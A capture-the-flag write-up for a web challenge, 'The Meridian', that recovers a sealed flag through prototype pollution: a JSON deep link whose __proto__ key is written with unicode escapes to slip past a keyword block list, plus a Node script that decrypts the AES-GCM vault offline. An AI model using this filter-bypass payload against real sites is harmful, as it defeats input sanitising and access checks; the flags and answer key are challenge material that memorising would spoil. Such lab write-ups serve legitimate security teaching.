---
title: "The Meridian"
category: "Web"
tags: ["prototype-pollution", "aes-gcm"]
solve_date: "2026-10-11T11:46:00+07:00"
language: "en"
---

# The Meridian

**Flag:** `isfcr{d33p_m3rg3_p0llut3s_th3_pr0v3n4nc3_v4ult_1n_th3_m3r1d14n}`  
**Target:** `https://<instance>.chals.io/` (per-team static host, e.g. `isfcrpesu-the-meridian.chals.io`)

The whole challenge is served as static files and all crypto runs in the browser, so the same steps work offline against the downloaded assets.

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `index.html` | 1,977 | `f45bd1ea76344e4cc144f6f0ef2fe000eeac218c431de2a97dc6f8e6a3fb5489` |
| `assets/js/app.js` | 12,738 | `90b200575309c8c90efb071aa4a53184ab8e05b1f81b58bcc950764f6446a53c` |
| `assets/js/app.js.map` | 369 | `1a138bdd7795b95edbdc3c18e03e20e61cf9f80bfebf851de01819cb83ebb71f` |
| `assets/js/core.js` | 4,598 | `72afcb78b1e9369eb4d8a8cd8f98d4b63d7b2b172a01da62e05ec5dd9ee7cd74` |
| `data/meridian-data.js` | 6,165 | `08f8a099764493c9d85a3ca4b744c8565863f32fa9830b0b58d0e592c6e4901b` |
| `assets/js/legacy/provenance-v2.js` | 662 | `e0daca39d032cbbfec97aeab24679a3b32e07279a90772c2519147c6fc7da050` |
| `assets/js/art.js` | 2,794 | `484d82f4dc78b060009c3e88c52c0e620673c320f8600102e3f2d97cad0242a6` |
| `vendor/mcrypto.js` | 9,003 | `7b72f737fec2941fa6c1e34e23b88230bf607216f94f780d4dab753afb53661d` |
| `assets/css/meridian.css` | 9,273 | `ec5ff02cfded2baa87b402757674af0e1423a5ef83a6f7dffead5bfd1dd23d47` |

## Challenge

The Meridian is a museum site: fourteen prints, journal notes, view settings that can be shared as a deep link, and a `#/vault` page holding "the one negative we never exhibit". The vault is sealed. Opening it requires an operator descriptor `{curators:[...], rounds:N}` in the runtime configuration, which public builds strip out.

## Initial Analysis

`core.js` contains both the sanitizer and the vault client:

```js
function sanitizeConfig(cfg) {
  ...
  if (Object.prototype.hasOwnProperty.call(cfg, "vault")) delete cfg.vault;
  return cfg;
}
function openVault(cfg, vault) {
  var d = cfg.vault;
  if (!isObj(d) || !Array.isArray(d.curators) || typeof d.rounds !== "number") return { state: "sealed" };
  if (d.rounds < 1 || d.rounds > 20000) return { state: "sealed" };
  var h = M.strToBytes(vault.bsalt + ":" + d.curators.join("|"));
  for (var i = 0; i < d.rounds; i++) h = M.sha256(h);
  var pt = M.aesGcmDecrypt(h, ..., M.strToBytes(vault.aad));
  return pt ? { state: "open", text: ... } : { state: "rejected" };
}
```

Two properties of this code decide the solve:

1. `sanitizeConfig` only removes an **own** `vault` property. A `vault` value reachable through the prototype chain survives, and `cfg.vault` still reads it.
2. The AES-GCM tag is the oracle. `data/meridian-data.js` ships `bsalt`, `aad` and the ciphertext, so any candidate descriptor is confirmed or rejected with no interaction with a server.

Configuration is built from two attacker-controlled sources, both screened by the same filter before parsing:

```js
var BLOCK = /__proto__|constructor|prototype/i;
function parseStatePayload(text) {
  if (typeof text !== "string" || BLOCK.test(text)) return null;
  try { var o = JSON.parse(text); return isObj(o) ? o : null; } catch (e) { return null; }
}
```

The filter runs on the raw text, `JSON.parse` runs afterwards, and `deepMerge` assigns with `target[k] = sv`. Those three facts are the gadget: an escaped key survives parsing as the literal own property `__proto__`, and the assignment then hits the `__proto__` setter.

## Eliminated Hypotheses

Every other flag-shaped string in the build is a decoy, and each one says so:

| Source | Candidate | Why rejected |
|---|---|---|
| `app.js.map` `sourcesContent` | `isfcr{s0urc3m4p_wh1sp3rs_l13s}` | The companion line `DEV_VAULT_KEY = sha256(PEPPER)` is not a key `openVault` accepts: `sha256(pepper)` for both the v2 and v3 pepper fails the GCM tag. |
| `legacy.masked[0]` | `isfcr{l3g4cy_st4ff_c0ns0l3_1s_n0t_th3_v4ult}` | The following console line states the token does not open the vault. |
| `RegistrarV2.SELFTEST` | `isfcr{wr0ng_p3pp3r_r1ght_curs3}` | Only decodes cleanly under the `v2` pepper, and labels itself as the wrong pepper. |
| Verdigris `provenance` (hex, then ROT13) | `isfcr{pr0v3n4nc3_pl4qu3_w4s_a_f0rg3ry}` | Verdigris fails certificate verification under both peppers. |

The `v2` pepper in `assets/js/legacy/provenance-v2.js` (which claims "this is the pepper the registrar desk signs with") was tested exhaustively rather than dismissed: the three records it validates give curators `["A. Brenner","J. Prochazka","L. Nakamura"]`, and no `rounds` value in the whole accepted range 1..20000 decrypts the blob. The eight-record union of both peppers is also rejected. Within the descriptor space tested, only the `v3` pepper set opens the vault.

## Exploitation Chain

### 1. Enumerate real assets

nginx serves `index.html` for any unknown path with HTTP 200, so presence probing is useless; real files are distinguished by `Content-Type` and size. `index.html` lists six scripts, including `vendor/mcrypto.js`, a dependency-free SHA-256 plus AES-256-GCM implementation, and `data/meridian-data.js`, which carries the exhibit records and the sealed blob.

### 2. Read the re-key memo

`Core.staffConsole` is gated on `features.vault`, which the sanitizer also strips, so the console is unreachable in the UI. That gate is irrelevant offline: `legacy.masked` entries are just base64 XOR-repeated with the pepper. XOR with the `core.js` pepper produces seven readable lines, including the descriptor recipe:

```text
LEGACY CONSOLE SESSION RESTORED - operator token: isfcr{l3g4cy_st4ff_c0ns0l3_1s_n0t_th3_v4ult}
This token opened the old console only. It does NOT open the vault.
--- REG-2291 vault re-key procedure (2021) ---
The vault no longer trusts the console. It reads an operator descriptor from runtime config: vault = { curators: [...], rounds: N }.
curators: the curator of every piece whose certificate verifies against the CURRENT registrar pepper, in accession order. The gallery badge is not a verification.
rounds: 1000 + (sum of the accession years of those same pieces, mod 4096).
Public builds strip any vault descriptor they can see. Staff: use the registrar build.
```

"CURRENT registrar pepper" is the one in `core.js`, `meridian::provenance::v3::do-not-share`, matching the journal post about the 2021 key rotation ("Some were not [re-issued]"). The verification function is `sig == hex(sha256(accession|title|curator|pepper))[0:12]`, and the gallery badge is deliberately weaker — `hasCertificate` only checks that `sig` is a 12-character string.

Applying the real check to all fourteen records: two carry no `sig` at all, five verify under the current pepper, three still match the stale `v2` pepper, and four match neither. Only the five current ones enter the descriptor.

| Accession | Year | Curator |
|---|---:|---|
| MRD-1971-0148 | 1971 | E. Vantar |
| MRD-1984-0912 | 1984 | R. Oikawa |
| MRD-1990-0025 | 1990 | H. Delacroix |
| MRD-2003-0777 | 2003 | K. Adeyemi |
| MRD-2011-0410 | 2011 | S. Marchetti |

Sum of years 9959, `9959 mod 4096 = 1767`, so `rounds = 2767`.

### 3. Deliver the descriptor through the deep link

`loadConfig` reads the `s` parameter from any hash route, not only `/collection`, so `#/vault?s=...` is enough. The payload is JSON where `vault` sits under an `__proto__` key written with `\u005f` escapes. The regex never sees `__proto__` (only `proto`, which is not one of its three alternatives), `JSON.parse` creates a genuine own `__proto__` property, and `deepMerge` writes it with `=`:

```json
{"\u005f\u005fproto\u005f\u005f":{"vault":{"curators":["E. Vantar","R. Oikawa","H. Delacroix","K. Adeyemi","S. Marchetti"],"rounds":2767}}}
```

Base64url-encoded into the link:

```text
https://<instance>.chals.io/#/vault?s=eyJcdTAwNWZcdTAwNWZwcm90b1x1MDA1Zlx1MDA1ZiI6eyJ2YXVsdCI6eyJjdXJhdG9ycyI6WyJFLiBWYW50YXIiLCJSLiBPaWthd2EiLCJILiBEZWxhY3JvaXgiLCJLLiBBZGV5ZW1pIiwiUy4gTWFyY2hldHRpIl0sInJvdW5kcyI6Mjc2N319fQ
```

`isObj(sv)` is true for the pollution object, so the merge target becomes `Object.prototype` itself and `vault` lands there; `hasOwnProperty(cfg, "vault")` is then false and the sanitizer leaves it alone. The observable result in the page is that `cfg.vault` resolves to the descriptor and `openVault` returns `state: "open"`.

Rendering the link in a browser returns the exhibit text:

```text
Vault open

Negative MRD-0000-0000 · the one we never exhibit:

isfcr{d33p_m3rg3_p0llut3s_th3_pr0v3n4nc3_v4ult_1n_th3_m3r1d14n}
```

### 4. Confirm the plaintext independently

The site's own `mcrypto.js` is not needed to trust the result. Re-implementing the derivation with Node's built-in `crypto` (iterated SHA-256, `aes-256-gcm`, AAD `meridian-vault`) decrypts the same blob and `final()` succeeds, meaning the GCM tag verifies. `d.rounds` is also inside the range the client accepts, so the link and the offline script agree.

## Flag

```text
isfcr{d33p_m3rg3_p0llut3s_th3_pr0v3n4nc3_v4ult_1n_th3_m3r1d14n}
```

Recovered from the sealed vault blob: authenticated by the AES-GCM tag, and displayed by the live page's own `#/vault` view. It was not submitted to the scoring service, so acceptance is unconfirmed.

## Reproduce

Requires Node.js 18+ (global `fetch`) and a running instance, or a local copy of `data/meridian-data.js`.

Save the script below as `solve.js`, then point it at the instance or at the local file:

```powershell
node solve.js https://<instance>.chals.io/
node solve.js site\data\meridian-data.js
```

```js
#!/usr/bin/env node
"use strict";
const fs = require("fs");
const vm = require("vm");
const crypto = require("crypto");

const PEPPER = "meridian::provenance::v3::do-not-share"; // current registrar pepper (core.js)
const sha256 = (b) => crypto.createHash("sha256").update(b).digest();

async function loadData(src) {
  const js = src.startsWith("http")
    ? await (await fetch(src.replace(/\/$/, "") + "/data/meridian-data.js")).text()
    : fs.readFileSync(src, "utf8");
  const sandbox = { window: {} };
  vm.createContext(sandbox);
  vm.runInContext(js, sandbox);
  return sandbox.window.__MERIDIAN__;
}

const sigFor = (ex) =>
  sha256(Buffer.from(`${ex.accession}|${ex.title}|${ex.curator}|${PEPPER}`)).toString("hex").slice(0, 12);

function openVault(vault, curators, rounds) {
  let h = sha256(Buffer.from(`${vault.bsalt}:${curators.join("|")}`));
  for (let i = 1; i < rounds; i++) h = sha256(h);
  const d = crypto.createDecipheriv("aes-256-gcm", h, Buffer.from(vault.blob.iv, "base64"));
  d.setAAD(Buffer.from(vault.aad));
  d.setAuthTag(Buffer.from(vault.blob.tag, "base64"));
  return Buffer.concat([d.update(Buffer.from(vault.blob.ct, "base64")), d.final()]).toString("utf8");
}

(async () => {
  const D = await loadData(process.argv[2]);
  const verified = D.exhibits
    .slice()
    .sort((a, b) => (a.accession < b.accession ? -1 : 1))
    .filter((e) => e.sig && e.sig === sigFor(e));
  const curators = verified.map((e) => e.curator);
  const rounds = 1000 + (verified.reduce((a, e) => a + e.year, 0) % 4096);
  console.log(`descriptor: ${JSON.stringify(curators)} rounds=${rounds}`);
  console.log(`FLAG: ${openVault(D.vault, curators, rounds)}`); // throws if the tag fails
})().catch((e) => { console.error("FAILED:", e.message); process.exit(1); });
```

Expected output:

```text
descriptor: ["E. Vantar","R. Oikawa","H. Delacroix","K. Adeyemi","S. Marchetti"] rounds=2767
FLAG: isfcr{d33p_m3rg3_p0llut3s_th3_pr0v3n4nc3_v4ult_1n_th3_m3r1d14n}
```

The manual path is the same in two steps: read the memo lines by XOR-ing `legacy.masked` with the pepper, then load the `#/vault?s=` link above in the site. To rebuild the link for another descriptor, replace the `curators` and `rounds` values inside the JSON, keep the `\u005f` escapes on the `__proto__` key, and re-encode as base64url without padding.
